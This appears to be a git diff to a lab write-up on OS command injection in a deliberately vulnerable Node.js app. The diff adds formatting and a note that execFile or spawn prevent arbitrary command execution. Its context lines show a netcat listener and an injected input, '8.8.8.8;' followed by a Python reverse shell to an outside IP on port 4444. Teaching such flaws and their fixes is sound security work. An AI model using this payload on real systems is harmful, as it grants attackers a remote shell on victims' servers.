@@ -82,6 +82,8 @@ module.exports.userSearch = function (req, res) {
 
 ---
 
+<br><br>
+
 # OS Command Injection
 
 ## Exploiting
@@ -108,7 +110,13 @@ nc -nlvp 4444
 8.8.8.8; python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("138.68.66.98",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' 
 ```
 
+
 ### The fix
+
+~~~
+We can use `exec_file` or `spawn` method under child_process which will prevent arbitrary command execution.
+~~~
+
 ### Edits to the `core\appHandler.js`
 
 ```js
